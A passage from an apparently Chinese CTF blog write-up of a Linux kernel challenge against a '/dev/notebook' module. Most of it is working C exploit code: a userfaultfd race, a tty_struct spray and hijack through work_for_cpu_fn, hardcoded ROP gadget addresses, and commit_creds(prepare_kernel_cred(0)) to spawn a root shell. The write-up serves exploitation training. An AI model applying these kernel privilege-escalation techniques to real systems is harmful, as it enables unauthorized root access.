class=\"line\">\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"都什么版本了还在用传统rop-work_for_cpu_fun\"><a class=\"markdownIt-Anchor\" href=\"#都什么版本了还在用传统rop-work_for_cpu_fun\">#</a> 都什么版本了还在用传统 ROP - work_for_cpu_fun</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">    <span class=\"type\">long</span> (*fn)(<span class=\"type\">void</span> *);</span><br><span class=\"line\">    <span class=\"type\">void</span> *arg;</span><br><span class=\"line\">    <span class=\"type\">long</span> ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">work_for_cpu_fn</span><span class=\"params\">(<span class=\"keyword\">struct</span> work_struct *work)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> *<span class=\"title\">wfc</span> =</span> container_of(work, <span class=\"keyword\">struct</span> work_for_cpu, work);</span><br><span class=\"line\">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们把我们的 <code>fake_tty_struct</code>  假装成 <code>work_for_cpu</code></p>\n<p>劫持 <code>ops</code>  为 <code>work_for_cpu_fn</code></p>\n<p>调用 <code>operation</code>  的时候正好把自己传入调用 而且非常非常干净 不篡改任何其他值</p>\n<p>这就能实现一个单参函数调用的原语</p>\n<p>两次原语即可 <code>commit_creds(prepare_kernel_cred(0))</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pthread.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/ioctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/types.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;poll.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;include/head.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;semaphore.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PAGE_SIZE 1024</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint64_t</span> u64;</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"type\">uint32_t</span> u32;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> uffd, note_fd;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> mod_base_addr, cookie ,kernel_base_addr;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> fault_page, fault_page_len;</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> target, modprobe_path;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> errExit(msg) &#123; \\</span></span><br><span class=\"line\"><span class=\"meta\">\tperror(msg);       \\</span></span><br><span class=\"line\"><span class=\"meta\">\texit(1);\t\t   \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> idx;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> size;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> buf;</span><br><span class=\"line\">&#125;userarg;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAX_ELEM 0x100</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">enum</span>&#123;</span> </span><br><span class=\"line\">\tSWAPGS_POP_RET, IRETQ, COMMIT_CREDS,</span><br><span class=\"line\">\tPREPARE_KERNEL_CRED, </span><br><span class=\"line\">\tSUB_RSP_RET ,PUSH_RDI_POP_RSP_POP_RET,</span><br><span class=\"line\">\tPOP_RDI ,POP_RSP,</span><br><span class=\"line\">\tMOV_RDI_RAX_POP_RET,</span><br><span class=\"line\">\tTERMINATOR</span><br><span class=\"line\">&#125;;<span class=\"comment\">//PREPARE_KERNEL_CRED, COMMIT_CREDS, &#125;;</span></span><br><span class=\"line\">u64 a[MAX_ELEM];</span><br><span class=\"line\"><span class=\"comment\">//tty_struct结构体的大小</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class=\"line\"><span class=\"comment\">//如果我们申请0x2E0的空间，slab分配的堆实际大小为0x400 </span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> REAL_HEAP_SIZE 0x400</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> RAW_KERNEL_BASE 0xffffffff81000000</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect1[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">int</span> ptmx_fds[<span class=\"number\">0x100</span>];<span class=\"comment\">// 测了我很久才发现这个b被不知道谁溢出了 加两个保护挡一下</span></span><br><span class=\"line\"><span class=\"type\">int</span> protect2[<span class=\"number\">0x1000</span>];</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">init</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\ta[SWAPGS_POP_RET] \t\t\t= <span class=\"number\">0xffffffff810637d4</span>;</span><br><span class=\"line\">\ta[IRETQ] \t\t\t\t\t= <span class=\"number\">0xffffffff810338bb</span>;</span><br><span class=\"line\">\ta[COMMIT_CREDS] \t\t\t= <span class=\"number\">0xffffffff810a9b40</span>;</span><br><span class=\"line\">\ta[PREPARE_KERNEL_CRED]\t\t= <span class=\"number\">0xffffffff810a9ef0</span>;</span><br><span class=\"line\">\ta[SUB_RSP_RET] \t\t\t\t= <span class=\"number\">0xffffffff8100354f</span>;</span><br><span class=\"line\">\ta[PUSH_RDI_POP_RSP_POP_RET] = <span class=\"number\">0xffffffff8143f4e1</span>;</span><br><span class=\"line\">\ta[POP_RDI]\t\t\t\t    = <span class=\"number\">0xffffffff81007115</span>;</span><br><span class=\"line\">\ta[POP_RSP] \t\t\t\t\t= <span class=\"number\">0xffffffff810bc110</span>;</span><br><span class=\"line\">\ta[MOV_RDI_RAX_POP_RET]\t\t= <span class=\"number\">0xffffffff81045833</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 work_for_cpu_fn = <span class=\"number\">0xffffffff8109eb90</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">addKernelBase</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; TERMINATOR ;i++)&#123;</span><br><span class=\"line\">\t\ta[i] += kernel_base_addr - <span class=\"number\">0xffffffff81000000</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getshell</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;UID is %d&quot;</span>, getuid());</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(getuid() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;Get shell&quot;</span>);</span><br><span class=\"line\">\t\tsystem(<span class=\"string\">&quot;/bin/sh&quot;</span>);</span><br><span class=\"line\">\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Get shell failed&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">u64 user_cs, user_ss, user_sp, user_flags;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">saveState</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t__asm__ (</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %cs, user_cs;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %ss, user_ss;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;mov %rsp, user_sp;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pushf;&quot;</span></span><br><span class=\"line\">\t\t<span class=\"string\">&quot;pop user_flags;&quot;</span></span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;saveState&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">getRoot</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *(*pkc)(<span class=\"type\">int</span>) = (<span class=\"type\">void</span> *(*)(<span class=\"type\">int</span>))(a[PREPARE_KERNEL_CRED]);</span><br><span class=\"line\">\t<span class=\"type\">void</span> (*cc)(<span class=\"type\">void</span> *) = (<span class=\"type\">void</span> (*)(<span class=\"type\">void</span> *))(a[COMMIT_CREDS]);</span><br><span class=\"line\">\t(*cc)((*pkc)(<span class=\"literal\">NULL</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">add</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> size, <span class=\"type\">void</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)size;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x100</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">del</span><span class=\"params\">(<span class=\"type\">size_t</span> idx)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x200</span> ,&amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">edit</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">size_t</span> newsize, <span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.idx = (<span class=\"type\">uint64_t</span>)idx;</span><br><span class=\"line\">\targ.size = (<span class=\"type\">uint64_t</span>)newsize;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">0x300</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">gift</span><span class=\"params\">(<span class=\"type\">char</span> *buf)</span>&#123;</span><br><span class=\"line\">\tuserarg arg;</span><br><span class=\"line\">\targ.buf = (<span class=\"type\">uint64_t</span>)buf;</span><br><span class=\"line\">\tioctl(note_fd, <span class=\"number\">100</span>, &amp;arg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">write_to_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\twrite(note_fd, user_buf, idx);<span class=\"comment\">// 逆向 mynote_read可以得到</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">read_from_kernel</span><span class=\"params\">(<span class=\"type\">size_t</span> idx, <span class=\"type\">char</span> *user_buf)</span>&#123;</span><br><span class=\"line\">\tread(note_fd, user_buf, idx);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">char</span> *buf;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> *buf;</span><br><span class=\"line\">\tu64 size;</span><br><span class=\"line\">&#125;notebook;</span><br><span class=\"line\"></span><br><span class=\"line\">notebook ntbk[<span class=\"number\">10</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> heap[<span class=\"number\">2</span>];</span><br><span class=\"line\"><span class=\"type\">uint64_t</span> notebook_addr;</span><br><span class=\"line\">u64 fake_tty_struct[<span class=\"number\">128</span>];</span><br><span class=\"line\">u64 fake_tty_ops[<span class=\"number\">128</span>];</span><br><span class=\"line\"><span class=\"type\">char</span> zero[PAGE_SIZE] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> &#123;</span></span><br><span class=\"line\">\tu64 a[<span class=\"number\">4</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_for_cpu</span> &#123;</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">work_struct</span> <span class=\"title\">work</span>;</span></span><br><span class=\"line\">\t<span class=\"type\">long</span> (*fn)(<span class=\"type\">void</span> *);</span><br><span class=\"line\">\t<span class=\"type\">void</span> *arg;</span><br><span class=\"line\">\t<span class=\"type\">long</span> ret;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\tinit();</span><br><span class=\"line\">\tsaveState();</span><br><span class=\"line\">\tnote_fd = open(<span class=\"string\">&quot;/dev/notebook&quot;</span>, O_RDWR);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;note_fd is %d&quot;</span>,note_fd);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(note_fd &lt; <span class=\"number\">0</span>) errExit(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tbuf = <span class=\"built_in\">calloc</span>(<span class=\"number\">1</span>, <span class=\"number\">0x100</span>);<span class=\"comment\">// name的长度</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tFILE * stream = popen(<span class=\"string\">&quot;cat /tmp/moduleaddr | awk &#x27;&#123;print $6&#125;&#x27;&quot;</span>, <span class=\"string\">&quot;r&quot;</span>);</span><br><span class=\"line\">\tassert(stream != <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tfread(buf, <span class=\"number\">0x10</span> + <span class=\"number\">2</span>, <span class=\"number\">1</span> ,stream);</span><br><span class=\"line\">\tmod_base_addr = strtoul(buf, <span class=\"literal\">NULL</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;moduleaddr is %lx&quot;</span>, mod_base_addr);</span><br><span class=\"line\"></span><br><span class=\"line\">\tfault_page = mmap(<span class=\"literal\">NULL</span>, <span class=\"number\">0x1000</span>, PROT_READ|PROT_WRITE, </span><br><span class=\"line\">\t\t\t\t\t\tMAP_PRIVATE | MAP_ANONYMOUS, <span class=\"number\">-1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">\tfault_page_len = <span class=\"number\">0x1000</span>;</span><br><span class=\"line\">\tuffd_register();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">0</span> ,<span class=\"number\">0x60</span> ,zero);</span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x3ff</span> ,zero);<span class=\"comment\">// 重新申请一个0x400的块</span></span><br><span class=\"line\">\tedit(<span class=\"number\">0</span> ,<span class=\"number\">0x400</span> ,fault_page);<span class=\"comment\">// 返回上一个原块的地址 写完size就卡住</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetchar();<span class=\"comment\">// 等待线程完成它的工作</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">// Info(&quot;ptmx_fds[%d] is %d&quot;, i, ptmx_fds[i]);</span></span><br><span class=\"line\">\t\tptmx_fds[i] = open(<span class=\"string\">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">//验证魔数</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(fake_tty_struct[<span class=\"number\">0</span>]  != <span class=\"number\">0x0000000100005401</span>)</span><br><span class=\"line\">\t\tPanic(<span class=\"string\">&quot;Magic number error, abort&quot;</span>);</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;fake_tty_struct&#x27;s addr is 0x%lx&quot;</span>, fake_tty_struct);</span><br><span class=\"line\">\t<span class=\"comment\">// 此时gdb看内存 可以看到相关泄漏的地址</span></span><br><span class=\"line\">\tu64 ptm_unix98_ops_addr = fake_tty_struct[<span class=\"number\">3</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((ptm_unix98_ops_addr &amp; <span class=\"number\">0xFFF</span>) == <span class=\"number\">0x320</span>) ptm_unix98_ops_addr += <span class=\"number\">0x120</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tkernel_base_addr = ptm_unix98_ops_addr - <span class=\"number\">0xe8e440</span>;</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;kernel base addr is 0x%lx&quot;</span>, kernel_base_addr);</span><br><span class=\"line\">\taddKernelBase();</span><br><span class=\"line\"></span><br><span class=\"line\">\tadd(<span class=\"number\">1</span>, <span class=\"number\">0x60</span>, zero);</span><br><span class=\"line\">\tedit(<span 